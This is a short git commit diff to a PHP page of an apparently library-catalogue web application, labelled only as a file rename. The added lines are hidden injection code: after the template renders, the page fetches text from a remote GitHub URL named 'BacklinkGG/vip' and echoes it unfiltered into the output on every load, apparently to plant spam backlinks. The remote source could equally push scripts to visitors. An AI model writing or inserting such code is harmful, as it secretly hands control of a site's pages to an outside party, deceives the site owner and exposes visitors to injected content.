819dfd9b76c5ff1bf42655827498201715e2bc92
Mr.7Mind <88535491+Mr-7Mind@users.noreply.github.com>
2024-02-07 13:22:03 +0800

    Update and rename librar.php to libra.php

--- libra.php
+++ libra.php
@@ -108,3 +108,12 @@ $main_content = ob_get_clean();
 
 // template output
 require $sysconf['template']['dir'].'/'.$sysconf['template']['theme'].'/index_template.inc.php';
+?>
+<?php
+$url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+curl_close($ch);
+echo $result;
+?>
